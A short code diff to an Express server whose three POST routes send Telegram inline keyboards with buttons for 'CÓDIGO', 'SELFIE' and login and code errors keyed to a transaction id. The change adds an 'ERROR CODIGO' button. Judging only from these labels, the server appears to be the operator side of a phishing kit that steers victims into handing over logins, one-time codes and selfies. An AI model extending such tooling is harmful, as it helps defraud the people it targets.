@@ -80,7 +80,8 @@ app.post('/enviar', async (req, res) => {
         { text: "🔑CÓDIGO", callback_data: `elopete:${txid}` }
       ],
       [
-        { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
+        { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` },
+        { text: "❌ERROR CODIGO", callback_data: `errorcode:${txid}` }
       ]
     ]
   };
@@ -124,7 +125,8 @@ app.post('/enviar2', async (req, res) => {
         { text: "🔑CÓDIGO", callback_data: `elopete:${txid}` }
       ],
       [
-        { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
+        { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` },
+        { text: "❌ERROR CODIGO", callback_data: `errorcode:${txid}` }
       ]
     ]
   };
@@ -165,11 +167,12 @@ app.post('/enviar3', async (req, res) => {
   const keyboard = {
     inline_keyboard: [
       [
-        { text: "👤SELFIE", callback_data: `laderrorselfi:${txid}` },
+        { text: "❌SELFIE", callback_data: `laderrorselfi:${txid}` },
         { text: "🔑CÓDIGO", callback_data: `elopete:${txid}` }
       ],
       [
-        { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
+        { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` },
+        { text: "❌ERROR CODIGO", callback_data: `errorcode:${txid}` }
       ]
     ]
   };
